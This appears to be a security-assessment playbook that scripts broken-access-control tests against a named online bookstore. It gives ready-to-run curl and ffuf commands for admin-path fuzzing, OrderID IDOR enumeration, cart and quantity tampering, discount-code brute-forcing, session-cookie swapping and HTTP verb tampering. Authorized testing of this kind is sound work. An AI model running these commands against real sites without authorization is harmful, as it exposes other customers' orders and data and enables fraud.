# A01 — Broken Access Control: CLI Commands
**Target:** `https://webservices.advanceware.net/gironbooksb2c/`
**Prepared by:** FraterIT Enterprises

> **Prerequisites:** Burp Suite running on `127.0.0.1:8080`. All `curl` commands route through Burp so every request is captured in HTTP History.
> Replace `YOUR_SESSION_COOKIE` with the actual `ASP.NET_SessionId` value captured from your browser after adding an item to the cart.

---

## Test 1 — Forced Browsing: Order History (Unauthenticated)

**Goal:** Access ORDER HISTORY without being logged in. If the server returns order data instead of redirecting to login, access control is broken.

```bash
# Step 1: Hit Order History page with no session cookie (unauthenticated)
curl -sk -x http://127.0.0.1:8080 \
  "https://webservices.advanceware.net/gironbooksb2c/OrderHistory.aspx" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -o orderhistory_unauth.html

# Inspect result — check if you get a redirect (302 to login) or actual content
grep -i "order\|login\|redirect\|location" orderhistory_unauth.html | head -30
```

**Pass:** HTTP 302 redirect to login page.
**Fail (finding):** HTTP 200 with order data — document as **High: Unauthenticated Access to Order History**.

---

## Test 2 — Forced Browsing: Common Admin / Sensitive Paths

**Goal:** Enumerate hidden or admin pages not linked from the UI.

```bash
# Save this wordlist as paths.txt
cat > /tmp/paths.txt << 'EOF'
Admin/
Admin/Default.aspx
Admin/Orders.aspx
Admin/Users.aspx
Admin/Reports.aspx
Manager/
Dashboard.aspx
OrderHistory.aspx
OrderDetail.aspx
CustomerList.aspx
Reports.aspx
UserManagement.aspx
Config.aspx
Settings.aspx
EOF

# Fuzz with ffuf (install: sudo apt install ffuf)
ffuf -u "https://webservices.advanceware.net/gironbooksb2c/FUZZ" \
  -w /tmp/paths.txt \
  -x http://127.0.0.1:8080 \
  -mc 200,301,302,403 \
  -o /tmp/ffuf_paths.json \
  -of json

# View results
cat /tmp/ffuf_paths.json | python3 -m json.tool | grep -E '"url"|"status"'
```

**Finding trigger:** Any `200` or `403` on admin paths — `403` still confirms the path exists.

---

## Test 3 — IDOR: Order ID Enumeration

**Goal:** Access other users' order details by iterating numeric Order IDs.

```bash
# First: browse to your own order confirmation to capture a real OrderID
# Then run the following, replacing 1000 with your known OrderID:

# Generate a range of IDs to test
for order_id in $(seq 990 1010); do
  status=$(curl -sk -o /dev/null -w "%{http_code}" \
    -x http://127.0.0.1:8080 \
    -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
    "https://webservices.advanceware.net/gironbooksb2c/OrderDetail.aspx?OrderID=${order_id}")
  echo "OrderID ${order_id}: HTTP ${status}"
done
```

```bash
# With ffuf for speed (generates IDs 1 to 9999)
ffuf -u "https://webservices.advanceware.net/gironbooksb2c/OrderDetail.aspx?OrderID=FUZZ" \
  -w <(seq 1 9999) \
  -x http://127.0.0.1:8080 \
  -H "Cookie: ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
  -mc 200 \
  -fs 0 \
  -o /tmp/ffuf_orderids.json \
  -of json
```

**Pass:** All non-owned orders return `302` (redirect to login) or `403`.
**Fail (finding):** Other users' order details returned — **Critical: IDOR on OrderID**.

---

## Test 4 — Cart Item Manipulation (IDOR on SKU)

**Goal:** Replace the cart item SKU with another product SKU to get unauthorized pricing or access restricted items.

```bash
# Step 1: Capture the ViewState from the cart page
curl -sk -x http://127.0.0.1:8080 \
  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
  "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?Recalc=Yes" \
  -o /tmp/cart.html

# Extract ViewState value
grep -oP '__VIEWSTATE[^>]*value="[^"]*"' /tmp/cart.html | head -5

# Step 2: Submit cart with a different SKU (swap out 9789501709421)
# Replace VIEWSTATE_VALUE with extracted value
curl -sk -x http://127.0.0.1:8080 \
  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
  -X POST \
  "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx" \
  -d "__VIEWSTATE=VIEWSTATE_VALUE" \
  -d "__EVENTVALIDATION=EVENTVALIDATION_VALUE" \
  -d "txtSKU=9789501709422" \
  -d "txtQty=1" \
  -d "btnRecalculate=Recalculate" \
  -o /tmp/cart_sku_swap.html

grep -i "price\|error\|invalid\|total" /tmp/cart_sku_swap.html | head -20
```

---

## Test 5 — Quantity Manipulation (Business Logic / Access Control)

**Goal:** Set quantity to 0, negative values, or extremely large values to trigger pricing errors.

```bash
# Negative quantity
curl -sk -x http://127.0.0.1:8080 \
  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
  -X POST \
  "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?Recalc=Yes" \
  -d "__VIEWSTATE=VIEWSTATE_VALUE" \
  -d "__EVENTVALIDATION=EVENTVALIDATION_VALUE" \
  -d "txtQty=-1" \
  -d "ctl00\$ContentPlaceHolder1\$btnRecalculate=Recalculate" \
  -o /tmp/cart_neg_qty.html
grep -i "total\|price\|error" /tmp/cart_neg_qty.html | head -10

# Zero quantity
curl -sk -x http://127.0.0.1:8080 \
  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
  -X POST \
  "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?Recalc=Yes" \
  -d "__VIEWSTATE=VIEWSTATE_VALUE" \
  -d "__EVENTVALIDATION=EVENTVALIDATION_VALUE" \
  -d "txtQty=0" \
  -d "ctl00\$ContentPlaceHolder1\$btnRecalculate=Recalculate" \
  -o /tmp/cart_zero_qty.html
grep -i "total\|price\|error" /tmp/cart_zero_qty.html | head -10

# Very large quantity (integer overflow attempt)
curl -sk -x http://127.0.0.1:8080 \
  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
  -X POST \
  "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?Recalc=Yes" \
  -d "__VIEWSTATE=VIEWSTATE_VALUE" \
  -d "__EVENTVALIDATION=EVENTVALIDATION_VALUE" \
  -d "txtQty=99999999" \
  -d "ctl00\$ContentPlaceHolder1\$btnRecalculate=Recalculate" \
  -o /tmp/cart_big_qty.html
grep -i "total\|price\|error\|overflow" /tmp/cart_big_qty.html | head -10
```

---

## Test 6 — Discount Code Enumeration

**Goal:** Brute-force valid discount codes — if no rate limiting exists, codes can be enumerated.

```bash
# Generate a common discount code wordlist
cat > /tmp/discount_codes.txt << 'EOF'
SAVE10
SAVE20
SAVE50
DISCOUNT10
DISCOUNT20
PROMO10
PROMO2024
WELCOME
WELCOME10
GIRONBOOKS
GIRON10
SPANISH10
BOOK10
VIP
VIP20
SUMMER
SUMMER24
HOLIDAY
HOLIDAY10
FREE
FREESHIPPPING
TEST
ADMIN
EOF

# Fuzz discount codes with ffuf
ffuf -u "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?Recalc=Yes" \
  -X POST \
  -x http://127.0.0.1:8080 \
  -H "Cookie: ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "__VIEWSTATE=VIEWSTATE_VALUE&__EVENTVALIDATION=EVENTVALIDATION_VALUE&txtDiscountCode=FUZZ&ctl00\$ContentPlaceHolder1\$btnRecalculate=Recalculate" \
  -w /tmp/discount_codes.txt \
  -mr "discount applied|code valid|% off|\$[0-9]" \
  -o /tmp/ffuf_discount.json \
  -of json

cat /tmp/ffuf_discount.json | python3 -m json.tool
```

**Finding trigger:** Valid code accepted with no lockout after N attempts = **Medium: No Rate Limiting on Discount Code Field**.

---

## Test 7 — Session / Cart Hijacking (Horizontal Privilege Escalation)

**Goal:** Use one user's session cookie to access another user's cart or checkout.

```bash
# Step 1: Open two browsers / incognito windows
# Window A: Add book to cart, copy ASP.NET_SessionId from DevTools → Application → Cookies
# Window B: Add different book to cart, copy its session ID

# Step 2: Swap cookies — use Window A's session ID in this request
# If the server returns Window B's cart contents, session isolation is broken

curl -sk -x http://127.0.0.1:8080 \
  -b "ASP.NET_SessionId=SESSION_FROM_USER_B" \
  "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?Recalc=Yes" \
  -o /tmp/cart_hijack.html

grep -i "9789501709421\|CompaneroMisterios\|total\|item" /tmp/cart_hijack.html | head -20
```

---

## Test 8 — HTTP Verb Tampering

**Goal:** Bypass access control by changing the HTTP method.

```bash
# Test DELETE on the cart endpoint
curl -sk -x http://127.0.0.1:8080 \
  -X DELETE \
  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
  "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx" \
  -v 2>&1 | grep -E "HTTP|Allow|Location"

# Test PUT
curl -sk -x http://127.0.0.1:8080 \
  -X PUT \
  -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
  "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx" \
  -v 2>&1 | grep -E "HTTP|Allow|Location"

# Test OPTIONS — reveals allowed methods
curl -sk -x http://127.0.0.1:8080 \
  -X OPTIONS \
  "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx" \
  -v 2>&1 | grep -E "HTTP|Allow|Access-Control"
```

---

## Test 9 — Recalc Parameter Tampering

**Goal:** Manipulate the `Recalc` URL parameter to trigger unintended server-side logic.

```bash
# Try undocumented values for Recalc
for val in "No" "True" "False" "1" "0" "admin" "all" "null" "undefined"; do
  status=$(curl -sk -o /dev/null -w "%{http_code}" \
    -x http://127.0.0.1:8080 \
    -b "ASP.NET_SessionId=YOUR_SESSION_COOKIE" \
    "https://webservices.advanceware.net/gironbooksb2c/ShoppingCart.aspx?Recalc=${val}")
  echo "Recalc=${val} → HTTP ${status}"
done
```

---

## Burp Suite: Intruder Setup for IDOR (GUI Steps)

For OrderID IDOR in Burp GUI:

1. In **Proxy → HTTP History**, find a `GET /OrderDetail.aspx?OrderID=XXXX` request
2. Right-click → **Send to Intruder**
3. **Positions tab**: Clear all, highlight the OrderID number → **Add §**
4. **Payloads tab**:
   - Payload type: `Numbers`
   - Range: `1` to `9999`, Step `1`
5. **Settings tab**:
   - Grep — Match: `Order`, `Name`, `Total`, `Address`
   - Grep — Extract the response length
6. **Start Attack**
7. Sort by **Length** — outliers = different content = potential IDOR hit

---

## Results Tracker

| Test | Result | HTTP Code | Notes |
|---|---|---|---|
| Test 1 — Unauth Order History | Pass / **FAIL** | | |
| Test 2 — Admin Path Fuzzing | Pass / **FAIL** | | |
| Test 3 — OrderID IDOR | Pass / **FAIL** | | |
| Test 4 — SKU Swap | Pass / **FAIL** | | |
| Test 5 — Negative Qty | Pass / **FAIL** | | |
| Test 6 — Discount Enumeration | Pass / **FAIL** | | |
| Test 7 — Session Hijack | Pass / **FAIL** | | |
| Test 8 — Verb Tampering | Pass / **FAIL** | | |
| Test 9 — Recalc Tampering | Pass / **FAIL** | | |

---

*FraterIT Enterprises — Confidential Security Assessment — A01 Broken Access Control*
